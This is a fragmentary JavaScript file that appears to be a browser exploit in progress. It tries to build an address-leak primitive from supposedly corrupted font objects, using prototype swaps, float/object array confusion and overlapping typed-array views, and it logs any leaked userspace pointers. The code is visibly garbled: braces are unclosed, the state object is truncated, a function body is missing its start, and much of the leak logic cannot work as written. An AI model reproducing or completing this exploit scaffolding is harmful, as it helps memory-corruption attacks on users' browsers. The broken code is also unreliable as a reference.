"use strict";

let logBuf = [];
function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.textContent = logBuf.join('\n');
        d.scrollTop = d.scrollHeight;

}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

function hex64(low, high) {
    if (low < 0) low = low >>> 0;
    if (high < 0) high = high >>> 0;
    return '0x' + high.toString(16).padStart(8, '0') + '_' + low.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    asDouble() {
        let buf = new ArrayBuffer(8);
        let u32 = new Uint32Array(buf);
        u32[0] = this.low;
        u32[1] = this.high;
        return new Float64Array(buf)[0];
    }
    
    toString() {
        return hex64(this.low, this.high);
    }
}

let state = {

        configurable: true,

// ============================================
// PHASE 2: ADDROF TECHNIQUE #1
// Float/Object Array Confusion
// ============================================

function phase2_technique1() {
    log('\n╔════════════════════════════════════════╗');
    log('║   TECHNIQUE #1: Array Type Confusion  ║');
    log('╚════════════════════════════════════════╝\n');
    
    let fonts = state.corrupted;
    if (!fonts) {
        log('[ERROR] No corrupted fonts\n');
        return;
    }
    
    let victim = fonts[0];
    state.victim = victim;
    
    log('[*] Strategy: Confuse Float64Array with regular Array\n');
    
    // Create two arrays that should occupy adjacent memory
    let floatArr = new Float64Array(100);
    let objArr = new Array(100);
    
    // Fill with patterns
    for (let i = 0; i < 100; i++) {
        floatArr[i] = 1.234567 + i;
        objArr[i] = { idx: i, marker: 0xBEEF0000 + i };
    }
    
    log('[*] Created Float64Array and Object Array');
    log('[*] Testing confusion via corrupted font...\n');
    
    let proto1 = {
        _floats: floatArr,
        _objs: objArr,
        
        leak: function(obj) {
            // Store object at index 10
            this._objs[10] = obj;
            
            // Try to read it as float from SAME position
            // This should give us the object pointer as a float
            let result = this._floats[10];
            
            return result;
        }
    };
    
    Object.setPrototypeOf(victim, proto1);
    
    // Test with multiple objects
    let testObjs = [
        { test: 1, marker: 0xAAAA },
        { test: 2, marker: 0xBBBB },
        new ArrayBuffer(0x1000)
    ];
    
    for (let i = 0; i < testObjs.length; i++) {
        try {
            log('[Test ' + (i+1) + '] Object: ' + testObjs[i]);
            let leaked = victim.leak(testObjs[i]);
            
            log('  Returned: ' + leaked);
            log('  Type: ' + typeof leaked);
            
            if (typeof leaked === 'number' && !isNaN(leaked)) {
                let addr = Int64.fromDouble(leaked);
                log('  As Int64: ' + addr.toString());
                
                // Check if it changed from pattern (1.234567 + 10 = 11.234567)
                let expected = 11.234567;
                if (Math.abs(leaked - expected) > 0.0001) {
                    log('  [+] VALUE CHANGED FROM PATTERN!');
                    
                    if (addr.high >= 0x7f000000 && addr.high <= 0x7fffffff) {
                        log('  [+++] USERSPACE ADDRESS LEAKED!');
                        state.leakedAddresses.push(addr);
                    } else if (addr.low !== 0 || addr.high !== 0) {
                        log('  [+] Non-zero value (might be tagged)');
                        state.leakedAddresses.push(addr);
                    }
                } else {
                    log('  [-] Still pattern value');
                }
            }
            log('');
            
        } catch(e) {
            log('  [ERROR] ' + e.message + '\n');
        }
    }
}

// ============================================

function phase3_technique2() {
    log('\n╔════════════════════════════════════════╗');
    log('║  TECHNIQUE #2: Backing Store Overlap  ║');
    log('╚════════════════════════════════════════╝\n');

        log('[ERROR] No victim\n');
        return;
    }
    
    log('[*] Strategy: Overlap TypedArray backing stores\n');
    
    // Create two views of same buffer
    let sharedBuffer = new ArrayBuffer(0x1000);
    let u32View = new Uint32Array(sharedBuffer);
    let f64View = new Float64Array(sharedBuffer);
    
    log('[*] Created shared ArrayBuffer with u32 and f64 views\n');
    
    let proto2 = {
        _u32: u32View,
        _f64: f64View,
        
        leak: function(obj) {
            // Store object in a temporary array
            let tempArr = [obj, obj, obj];
            
            // Write the array reference as u32 values
            // Then read back as float
            
            // Actually, store object, then access underlying buffer
            this._u32[0] = 0x41414141; // Marker
            
            // Try to write object reference
            try {
                // This is tricky - we need to force the object into the buffer
                tempArr.x = this._u32;
                tempArr.y = this._f64;
                
                // Read buffer after object interaction
                return this._f64[0];
                
            } catch(e) {
                return NaN;
            }
        }
    };
    
    Object.setPrototypeOf(victim, proto2);
    
    let testObj = { leak: true, val: 0x1337 };
    
    try {
        log('[Test] Attempting leak via backing store...');
        let result = victim.leak(testObj);
        
        log('  Result: ' + result);
        
        if (typeof result === 'number' && !isNaN(result)) {
            let addr = Int64.fromDouble(result);
            log('  As Int64: ' + addr.toString());
            
            if (addr.low !== 0 || addr.high !== 0) {
                log('  [+] Got non-zero value');
                state.leakedAddresses.push(addr);
            }
        }
        
    } catch(e) {
        log('  [ERROR] ' + e.message);
    }
    
    log('');
}

    // Create confusion setup
    let mixedArray = new Array(200);

    log('[*] Mixed objects and floats in array\n');
